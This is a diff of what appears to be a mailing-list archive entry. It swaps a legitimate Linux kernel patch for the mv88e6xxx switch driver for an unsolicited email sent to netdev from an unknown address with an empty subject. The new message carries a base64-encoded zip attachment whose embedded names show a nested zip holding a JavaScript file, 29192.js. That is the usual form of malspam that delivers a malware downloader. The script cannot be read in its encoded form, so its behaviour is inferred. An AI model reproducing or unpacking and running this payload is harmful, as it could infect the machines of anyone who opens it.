@@ -1,80 +1,75 @@
-From: Vivien Didelot <vivien.didelot@savoirfairelinux.com>
-Subject: [PATCH net-next] net: dsa: mv88e6xxx: better IEEE Prio Mapping Table description
-Date: Sat, 17 Jun 2017 23:07:14 -0400
-Message-ID: <20170618030714.32667-1-vivien.didelot@savoirfairelinux.com>
-Cc: linux-kernel@vger.kernel.org, kernel@savoirfairelinux.com,
-        "David S. Miller" <davem@davemloft.net>,
-        Florian Fainelli <f.fainelli@gmail.com>,
-        Andrew Lunn <andrew@lunn.ch>,
-        Vivien Didelot <vivien.didelot@savoirfairelinux.com>
-To: netdev@vger.kernel.org
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: netdev.vger.kernel.org
+From: <agar2000@hotmail.com>
+Subject: (unknown)
+Date: Sun, 18 Jun 2017 03:09:47 -0000
+Message-ID: <149775538772.30695.1935181963045770172@75-146-249-149-philadelphia.hfc.comcastbusiness.net>
+Mime-Version: 1.0
+Content-Type: application/zip; name="665495.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
+Return-path: <netdev-owner@vger.kernel.org>
+Received: from 75-146-249-149-Philadelphia.hfc.comcastbusiness.net ([75.146.249.149]:2664
+        "HELO 75-146-249-149-philadelphia.hfc.comcastbusiness.net"
+        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with SMTP
+        id S1753043AbdFRDJw (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Sat, 17 Jun 2017 23:09:52 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: netdev-owner@vger.kernel.org
+List-ID: <netdev.vger.kernel.org>
 
-Kill the remaining shift macro in favor of calculating at compile time
-its value from the more descriptive mask, which gives us a better
-representation of the register layout.
-
-Signed-off-by: Vivien Didelot <vivien.didelot@savoirfairelinux.com>
----
- drivers/net/dsa/mv88e6xxx/port.c | 11 +++++------
- drivers/net/dsa/mv88e6xxx/port.h |  4 +++-
- 2 files changed, 8 insertions(+), 7 deletions(-)
-
-diff --git a/drivers/net/dsa/mv88e6xxx/port.c b/drivers/net/dsa/mv88e6xxx/port.c
-index 73d825e08be3..a7801f6668a5 100644
---- a/drivers/net/dsa/mv88e6xxx/port.c
-+++ b/drivers/net/dsa/mv88e6xxx/port.c
-@@ -12,6 +12,7 @@
-  * (at your option) any later version.
-  */
- 
-+#include <linux/bitfield.h>
- #include <linux/if_bridge.h>
- #include <linux/phy.h>
- 
-@@ -912,15 +913,13 @@ int mv88e6095_port_tag_remap(struct mv88e6xxx_chip *chip, int port)
- }
- 
- static int mv88e6xxx_port_ieeepmt_write(struct mv88e6xxx_chip *chip,
--					int port, u16 table,
--					u8 pointer, u16 data)
-+					int port, u16 table, u8 ptr, u16 data)
- {
- 	u16 reg;
- 
--	reg = MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_UPDATE |
--		table |
--		(pointer << MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_POINTER_SHIFT) |
--		data;
-+	reg = MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_UPDATE | table |
-+		(ptr << __bf_shf(MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_PTR_MASK)) |
-+		(data & MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_DATA_MASK);
- 
- 	return mv88e6xxx_port_write(chip, port,
- 				    MV88E6390_PORT_IEEE_PRIO_MAP_TABLE, reg);
-diff --git a/drivers/net/dsa/mv88e6xxx/port.h b/drivers/net/dsa/mv88e6xxx/port.h
-index 8a34ea7c868a..8f3991bf1851 100644
---- a/drivers/net/dsa/mv88e6xxx/port.h
-+++ b/drivers/net/dsa/mv88e6xxx/port.h
-@@ -222,6 +222,7 @@
- /* Offset 0x18: IEEE Priority Mapping Table */
- #define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE			0x18
- #define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_UPDATE		0x8000
-+#define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_MASK			0x7000
- #define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_INGRESS_PCP		0x0000
- #define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_EGRESS_GREEN_PCP	0x1000
- #define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_EGRESS_YELLOW_PCP	0x2000
-@@ -229,7 +230,8 @@
- #define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_EGRESS_GREEN_DSCP	0x5000
- #define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_EGRESS_YELLOW_DSCP	0x6000
- #define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_EGRESS_AVB_DSCP	0x7000
--#define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_POINTER_SHIFT	9
-+#define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_PTR_MASK		0x0e00
-+#define MV88E6390_PORT_IEEE_PRIO_MAP_TABLE_DATA_MASK		0x01ff
- 
- /* Offset 0x18: Port IEEE Priority Remapping Registers (0-3) */
- #define MV88E6095_PORT_IEEE_PRIO_REMAP_0123	0x18
--- 
-2.13.1
+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
